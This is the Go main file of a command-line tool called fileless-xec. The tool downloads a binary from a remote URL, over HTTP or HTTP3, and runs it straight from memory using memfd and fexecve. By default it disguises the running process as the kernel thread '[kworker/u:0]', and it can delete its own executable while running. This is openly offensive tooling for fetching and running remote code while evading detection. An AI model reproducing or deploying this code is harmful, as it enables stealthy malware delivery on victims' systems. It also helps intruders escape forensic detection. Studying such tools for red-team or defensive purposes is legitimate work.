package main

import (
	"fileless-xec/pkg/exec"
	"fileless-xec/pkg/transport"
	"fmt"
	"os"
	"runtime"

	"github.com/spf13/cobra"
)

//Remove current file while its execution
func selfRemove() {
	err := os.Remove("./fileless-xec")
	if err != nil {
		fmt.Println(err)
	}
}

func main() {

	//CMD FILELESS-XEC
	var name string
	var http3 bool
	var selfRm bool
	var unstealth bool

	var cmdFilelessxec = &cobra.Command{
		Use:   "fileless-xec [remote_url]",
		Short: "Execute remote binary locally",
		Long:  `curl a remote binary file and execute it locally in one single step`,
		Args:  cobra.MinimumNArgs(1),
		Run: func(cmd *cobra.Command, args []string) {

			url := args[0]

			// get argument for binary execution
			argsExec := []string{name}
			argsExec = append(argsExec, args[1:]...) //argument if binary execution need them fileless-xec <binary_url> -- <flags> <values>
			environ := os.Environ()

			var binaryRaw string
			if http3 {
				binaryRaw = transport.GetBinaryRawHTTP3(url) //https if you used server from example
			} else {
				binaryRaw = transport.GetBinaryRaw(url)
			}

			if unstealth || runtime.GOOS == "windows" { //Unstealth mode
				binary := "dummy"
				if runtime.GOOS == "windows" {
					binary += ".exe"
				}
				//write binary file locally
				err := exec.WriteBinaryFile(binary, binaryRaw)
				if err != nil {
					fmt.Println(err)
				}
				//execute it
				err = exec.UnstealthyExec(binary, argsExec, environ)
				fmt.Println(err)

				if selfRm && runtime.GOOS != "windows" {
					selfRemove()
				}
			} else { //Stealth mode

				mfd := exec.PrepareStealthExec(binaryRaw)
				defer mfd.Close()
				fd := mfd.Fd()

				if selfRm && runtime.GOOS != "windows" {
					selfRemove()
				}

				exec.Fexecve(fd, argsExec, environ)
			}

		},
	}

	//flag handling
	cmdFilelessxec.PersistentFlags().StringVarP(&name, "name", "n", "[kworker/u:0]", "running process name")
	cmdFilelessxec.PersistentFlags().BoolVarP(&http3, "http3", "Q", false, "use of HTTP3 (QUIC) protocol")
	cmdFilelessxec.PersistentFlags().BoolVarP(&selfRm, "self-remove", "r", false, "remove fileless-xec while its execution (only on Linux). fileless-xec must be in the same repository that the excution process")
	cmdFilelessxec.PersistentFlags().BoolVarP(&unstealth, "unstealth", "u", false, "store the file locally on disk before executing it")

	cmdFilelessxec.Execute()
}
